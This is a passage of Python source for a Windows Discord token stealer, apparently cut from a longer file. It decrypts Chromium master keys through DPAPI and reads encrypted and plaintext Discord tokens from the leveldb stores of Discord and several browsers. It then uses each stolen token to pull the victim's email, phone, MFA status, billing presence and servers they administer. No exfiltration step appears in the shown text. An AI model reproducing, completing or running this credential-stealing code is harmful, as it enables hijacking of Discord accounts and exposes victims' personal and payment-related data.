class DataBlob(ctypes.Structure):
    _fields_ = [
        ("cbData", ctypes.c_ulong),
        ("pbData", ctypes.POINTER(ctypes.c_ubyte)),
    ]
def dpapi_decrypt(data):
    blob_in = DataBlob(
        len(data),
        ctypes.cast(
            ctypes.create_string_buffer(data, len(data)),
            ctypes.POINTER(ctypes.c_ubyte),
        ),
    )
    blob_out = DataBlob()
    if ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
    ):
        result = ctypes.string_at(blob_out.pbData, blob_out.cbData)
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
        return result
    return None
def get_master_key(browser_path):
    local_state = os.path.join(browser_path, "Local State")
    if not os.path.exists(local_state):
        return None
    try:
        with open(local_state, "r", encoding="utf-8") as f:
            data = json.loads(f.read())
        encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
        return dpapi_decrypt(encrypted_key)
    except Exception:
        return None

BCRYPT_AES_ALGORITHM = "AES"
BCRYPT_CHAINING_MODE = "ChainingMode"
BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM"
BCRYPT_AUTH_TAG_LENGTH = "AuthTagLength"

_bcrypt = ctypes.windll.bcrypt

class BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(ctypes.Structure):
    _fields_ = [
        ("cbSize", ctypes.c_ulong),
        ("dwInfoVersion", ctypes.c_ulong),
        ("pbNonce", ctypes.c_void_p),
        ("cbNonce", ctypes.c_ulong),
        ("pbAuthData", ctypes.c_void_p),
        ("cbAuthData", ctypes.c_ulong),
        ("pbTag", ctypes.c_void_p),
        ("cbTag", ctypes.c_ulong),
        ("pbMacContext", ctypes.c_void_p),
        ("cbMacContext", ctypes.c_ulong),
        ("cbAAD", ctypes.c_ulong),
        ("cbData", ctypes.c_ulonglong),
        ("dwFlags", ctypes.c_ulong),
    ]

def _bcrypt_aes_gcm_decrypt(key, nonce, ciphertext, tag):
    hAlg = ctypes.c_void_p()
    status = _bcrypt.BCryptOpenAlgorithmProvider(
        ctypes.byref(hAlg),
        BCRYPT_AES_ALGORITHM,
        None,
        0,
    )
    if status != 0:
        return None
    try:
        mode = BCRYPT_CHAIN_MODE_GCM.encode("utf-16-le")
        _bcrypt.BCryptSetProperty(
            hAlg,
            BCRYPT_CHAINING_MODE,
            mode,
            len(mode),
            0,
        )
        hKey = ctypes.c_void_p()
        key_buf = (ctypes.c_ubyte * len(key))(*key)
        status = _bcrypt.BCryptGenerateSymmetricKey(
            hAlg,
            ctypes.byref(hKey),
            None,
            0,
            key_buf,
            len(key),
            0,
        )
        if status != 0:
            return None
        try:
            nonce_buf = (ctypes.c_ubyte * len(nonce))(*nonce)
            tag_buf = (ctypes.c_ubyte * len(tag))(*tag)
            ct_buf = (ctypes.c_ubyte * len(ciphertext))(*ciphertext)
            pt_buf = (ctypes.c_ubyte * len(ciphertext))()

            auth_info = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO()
            auth_info.cbSize = ctypes.sizeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO)
            auth_info.dwInfoVersion = 1
            auth_info.pbNonce = ctypes.addressof(nonce_buf)
            auth_info.cbNonce = len(nonce)
            auth_info.pbTag = ctypes.addressof(tag_buf)
            auth_info.cbTag = len(tag)

            cbResult = ctypes.c_ulong(0)
            status = _bcrypt.BCryptDecrypt(
                hKey,
                ct_buf,
                len(ciphertext),
                ctypes.byref(auth_info),
                None,
                0,
                pt_buf,
                len(ciphertext),
                ctypes.byref(cbResult),
                0,
            )
            if status != 0:
                return None
            return bytes(pt_buf[:cbResult.value])
        finally:
            _bcrypt.BCryptDestroyKey(hKey)
    finally:
        _bcrypt.BCryptCloseAlgorithmProvider(hAlg, 0)

def aes_decrypt(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:-16]
        tag = buff[-16:]
        result = _bcrypt_aes_gcm_decrypt(key, iv, payload, tag)
        if result:
            return result.decode("utf-8", errors="ignore")
    except Exception:
        pass
    try:
        result = dpapi_decrypt(buff)
        if result:
            return result.decode("utf-8", errors="ignore")
    except Exception:
        pass
    return None
def get_profiles(browser_path):
    if not os.path.exists(browser_path):
        return []
    default = os.path.join(browser_path, "Default")
    if os.path.isdir(default):
        profiles = ["Default"]
        for item in os.listdir(browser_path):
            if item.startswith("Profile ") and os.path.isdir(
                os.path.join(browser_path, item)
            ):
                profiles.append(item)
        return profiles
    return [""]

_DEFAULT_HEADERS = {"User-Agent": "Mozilla/5.0"}

def _http_get(url, headers=None, timeout=10):
    hdrs = dict(_DEFAULT_HEADERS)
    if headers:
        hdrs.update(headers)
    req = Request(url, headers=hdrs)
    try:
        resp = urlopen(req, timeout=timeout, context=_SSL_CTX)
        return resp.status, resp.read()
    except HTTPError as e:
        return e.code, e.read()
    except Exception:
        return 0, b""

def _http_get_json(url, headers=None, timeout=10):
    code, body = _http_get(url, headers, timeout)
    if code == 200:
        return json.loads(body)
    return None

def validate_token(token):
    try:
        code, _ = _http_get(
            "https://discord.com/api/v9/users/@me",
            headers={"Authorization": token},
            timeout=5,
        )
        return code == 200
    except Exception:
        return False
def get_user_info(token):
    headers = {"Authorization": token}
    info = {}
    try:
        data = _http_get_json(
            "https://discord.com/api/v9/users/@me", headers=headers, timeout=5
        )
        if data:
            d = data
            if d.get("discriminator", "0") != "0":
                info["username"] = f"{d['username']}#{d['discriminator']}"
            else:
                info["username"] = d.get("global_name") or d["username"]
            info["id"] = d.get("id")
            info["email"] = d.get("email") or "None"
            info["phone"] = d.get("phone") or "None"
            info["mfa"] = d.get("mfa_enabled", False)
            nitro_map = {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}
            info["nitro"] = nitro_map.get(d.get("premium_type", 0), "Unknown")
    except Exception:
        pass
    try:
        data = _http_get_json(
            "https://discord.com/api/v9/users/@me/billing/payment-sources",
            headers=headers,
            timeout=5,
        )
        if data is not None:
            info["billing"] = len(data) > 0
        else:
            info["billing"] = False
    except Exception:
        info["billing"] = False
    return info
def get_admin_guilds(token):
    admin_guilds = []
    try:
        headers = {"Authorization": token}
        debug_log("get_admin_guilds: fetching guilds...")
        data = _http_get_json(
            "https://discord.com/api/v9/users/@me/guilds?with_counts=true",
            headers=headers,
            timeout=10,
        )
        if data is None:
            debug_log("get_admin_guilds: failed to fetch guilds")
            return admin_guilds
        guilds = data
        debug_log(f"get_admin_guilds: total guilds={len(guilds)}")
        for guild in guilds:
            perms = int(guild.get("permissions", 0))
            is_owner = guild.get("owner", False)
            if is_owner or (perms & 0x8):
                debug_log(f"get_admin_guilds: ADMIN match: {guild.get('name')} owner={is_owner} perms={perms} perm_raw={guild.get('permissions')}")
            if not (is_owner or (perms & 0x8)):
                continue
            entry = {
                "name": guild.get("name", "Unknown"),
                "id": guild["id"],
                "members": str(guild.get("approximate_member_count", "?")),
            }
            if entry["members"] == "?":
                try:
                    preview = _http_get_json(
                        f"https://discord.com/api/v9/guilds/{guild['id']}/preview",
                        headers=headers,
                        timeout=5,
                    )
                    if preview:
                        entry["members"] = str(preview.get("approximate_member_count", "?"))
                except Exception:
                    pass
            admin_guilds.append(entry)
        debug_log(f"get_admin_guilds: found {len(admin_guilds)} admin guilds")
    except Exception as e:
        debug_log(f"get_admin_guilds: EXCEPTION: {e}")
    return admin_guilds
def _validate_and_enrich(token, source):
    if not validate_token(token):
        return None
    info = get_user_info(token)
    guilds = get_admin_guilds(token)
    return {"source": source, "token": token, "user_info": info, "admin_guilds": guilds}
def grab_tokens():
    candidates = {}
    all_paths = {}
    for name, path in DISCORD_PATHS.items():
        if os.path.exists(path):
            all_paths[name] = {
                "leveldb": os.path.join(path, "Local Storage", "leveldb"),
                "local_state": path,
            }
    for name, path in BROWSERS.items():
        if not os.path.exists(path):
            continue
        for profile in get_profiles(path):
            profile_path = os.path.join(path, profile) if profile else path
            leveldb = os.path.join(profile_path, "Local Storage", "leveldb")
            if os.path.exists(leveldb):
                label = f"{name} ({profile})" if profile else name
                all_paths[label] = {"leveldb": leveldb, "local_state": path}
    for source, paths in all_paths.items():
        if not os.path.exists(paths["leveldb"]):
            continue
        key = get_master_key(paths["local_state"])
        for filename in os.listdir(paths["leveldb"]):
            if not filename.endswith((".ldb", ".log")):
                continue
            filepath = os.path.join(paths["leveldb"], filename)
            try:
                with open(filepath, "r", errors="ignore") as f:
                    content = f.read()
            except Exception:
                continue
            if key:
                for match in re.findall(r"dQw4w9WgXcQ:([^\s\"',\}\]]+)", content):
                    try:
                        token_bytes = base64.b64decode(match)
                        token = aes_decrypt(token_bytes, key)
                        if token and token not in candidates:
                            candidates[token] = source
                    except Exception:
                        pass
            for pattern in [
                r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}",
                r"mfa\.[\w-]{84}",
            ]:
                for match in re.findall(pattern, content):
                    if match not in candidates:
                        candidates[match] = source
    result = []
    seen_ids = set()
    with ThreadPoolExecutor(max_workers=8) as pool:
        futures = {
            pool.submit(_validate_and_enrich, token, source): token
            for token, source in candidates.items()
        }
        for future in as_completed(futures):
            entry = future.result()
            if entry is None:
                continue
            uid = entry["user_info"].get("id")
            if uid and uid in seen_ids:
                continue
            if uid:
                seen_ids.add(uid)
            result.append(entry)
    return result
